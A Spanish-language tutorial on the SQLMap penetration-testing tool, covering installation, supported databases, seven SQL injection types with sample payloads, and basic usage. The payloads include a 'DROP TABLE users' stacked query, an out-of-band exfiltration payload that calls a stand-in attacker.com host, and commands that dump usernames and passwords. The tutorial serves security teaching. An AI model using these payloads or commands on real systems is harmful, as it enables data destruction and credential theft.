### **SQLMap: Herramienta para la Detección y Explotación de Inyecciones SQL**

#### **¿Qué es SQLMap?**

SQLMap es una herramienta gratuita y de código abierto escrita en Python para realizar pruebas de penetración. Su objetivo es automatizar la detección y explotación de vulnerabilidades de inyección SQL (SQLi). Fue desarrollada en 2006 y sigue siendo mantenida activamente.

#### **Características Principales**

- **Motor de detección potente:** SQLMap identifica y explota una amplia gama de vulnerabilidades SQL.
- **Opciones avanzadas:** Configuración detallada para conexión, detección, enumeración, optimización, y bypass de protecciones.
- **Capacidades adicionales:**
    - Recuperación de datos de bases de datos.
    - Acceso al sistema de archivos.
    - Ejecución de comandos del sistema operativo.

---

### **Instalación de SQLMap**

SQLMap generalmente está preinstalado en distribuciones orientadas a la seguridad (como Kali Linux) y puede instalarse en Debian usando:

```bash
sudo apt install sqlmap
```

**Instalación manual:**

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py
```

---

### **Bases de Datos Compatibles**

SQLMap soporta una amplia gama de sistemas de gestión de bases de datos (DBMS), incluyendo:

- **Populares:** MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite.
- **Otros:** IBM DB2, MariaDB, Firebird, Amazon Redshift, CockroachDB, SAP MaxDB, entre otros.

---

### **Tipos de Inyección SQL Soportados**

SQLMap puede detectar y explotar todos los tipos de inyección SQL conocidos. Los métodos más comunes son:

#### **1. Boolean-based Blind SQL Injection**

- **Principio:** Se determina si una consulta SQL devuelve un valor _TRUE_ o _FALSE_ comparando las respuestas del servidor.
- **Ejemplo:**
    
    ```sql
    AND 1=1
    ```
    
- Es el tipo de inyección más común en aplicaciones web.

#### **2. Error-based SQL Injection**

- **Principio:** Se aprovechan los mensajes de error devueltos por el DBMS para extraer datos.
- **Ejemplo:**
    
    ```sql
    AND GTID_SUBSET(@@version,0)
    ```
    
- Este método es rápido pero está limitado a los datos devueltos por cada solicitud.

#### **3. UNION Query-based SQL Injection**

- **Principio:** Permite combinar resultados de consultas adicionales con la consulta original.
- **Ejemplo:**
    
    ```sql
    UNION ALL SELECT 1,@@version,3
    ```
    
- Es el método más rápido, ya que permite extraer datos completos en una sola solicitud.

#### **4. Stacked Queries**

- **Principio:** Inyección de múltiples consultas SQL en una sola ejecución.
- **Ejemplo:**
    
    ```sql
    ; DROP TABLE users
    ```
    
- Utilizado para ejecutar comandos avanzados, como manipulación de datos o ejecución de comandos del sistema operativo.

#### **5. Time-based Blind SQL Injection**

- **Principio:** Determina si una consulta es _TRUE_ o _FALSE_ midiendo el tiempo de respuesta del servidor.
- **Ejemplo:**
    
    ```sql
    AND 1=IF(2>1,SLEEP(5),0)
    ```
    
- Es más lento que Boolean-based Blind SQLi pero útil cuando no hay otra forma de obtener respuestas.

#### **6. Inline Queries**

- **Principio:** Inserta una consulta dentro de otra.
- **Ejemplo:**
    
    ```sql
    SELECT (SELECT @@version) from dual
    ```
    
- Este tipo es menos común y requiere aplicaciones escritas de una manera específica.

#### **7. Out-of-band SQL Injection**

- **Principio:** Utiliza canales como DNS o HTTP para exfiltrar datos cuando otros métodos no son viables.
- **Ejemplo:**
    
    ```sql
    LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
    ```
    
- SQLMap puede realizar exfiltración DNS mediante subdominios que contienen la respuesta SQL deseada.

---

### **Uso Básico de SQLMap**

1. **Ejecutar una prueba simple:**
    
    ```bash
    python sqlmap.py -u 'http://target.com/page.php?id=5'
    ```
    
2. **Especificar técnicas de inyección SQL:**
    
    ```bash
    python sqlmap.py -u 'http://target.com/page.php?id=5' --technique=BU
    ```
    
    Donde:
    - `B`: Boolean-based blind.
    - `U`: Union query-based.
3. **Extraer datos de una tabla específica:**
    
    ```bash
    python sqlmap.py -u 'http://target.com/page.php?id=5' --dump -T users -C username,password
    ```
    

---

### **Conclusión**

SQLMap es una herramienta esencial para la detección y explotación de inyecciones SQL, capaz de manejar múltiples tipos de inyección y DBMS. Al usar SQLMap, es importante hacerlo de forma ética y responsable, asegurándose de tener el permiso necesario para probar los sistemas objetivo.